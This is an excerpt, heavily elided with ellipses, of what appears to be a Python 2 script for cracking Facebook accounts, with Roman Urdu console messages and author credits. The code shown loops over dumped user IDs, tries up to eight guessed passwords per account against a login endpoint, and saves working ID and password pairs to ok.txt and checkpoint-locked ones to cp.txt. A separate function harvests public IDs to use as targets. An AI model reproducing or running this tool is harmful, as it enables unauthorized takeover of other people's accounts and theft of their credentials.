...
#CODING BY : MUhammad AjMaL(SYCO THE BRAND )
#DON'T FORGET TO GIVE CREDIT TO KASHIF
...
def crack_select1():
	...
	print("\033[93;1m  START HOGYA HAYE MZY")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [NAZIR-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
	...
	linex()
	print("")
	raw_input("\033[93;1m ENTER KO PIYAR SY CHUMII DO ")
	menu()
...
def crack_select():
	...
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[93;1m  SHURU HOGYA HY MAZY")
	print("\033[92;1m  BRUTE START HOGYA \x1b[0m")
	print("")
	linex()
	print("")
	def main(arg):
															...
															if "access_token" in q and "EAAA" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	if "access_token" in q and "EAAA" in q:
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [KASHIF-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
	...
	linex()
	print("")
	print("\033[93;1m KHATAM HOGYA BYE BYE")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m ENTER KO PIYAR SY KISS KRO ")
	menu()
...
def ex_id():
    ...
    logo()
    print ''
    print '\033[92;1m      PUBLIC ID DUMP KRO'
    print ''
    ...
    linex()
    print ''
    print '\033[92;1m KHATAM TATA BYE BYE GYA'
    print '\033[93;1m HAYE MAZY IDZ: \033[92;1m' + str(len(idg))
    print ''
    linex()
    print ''
    raw_input('\033[95;1m BHAI SAAB ENTER K OPR PIYAR SY KISS KRDO')
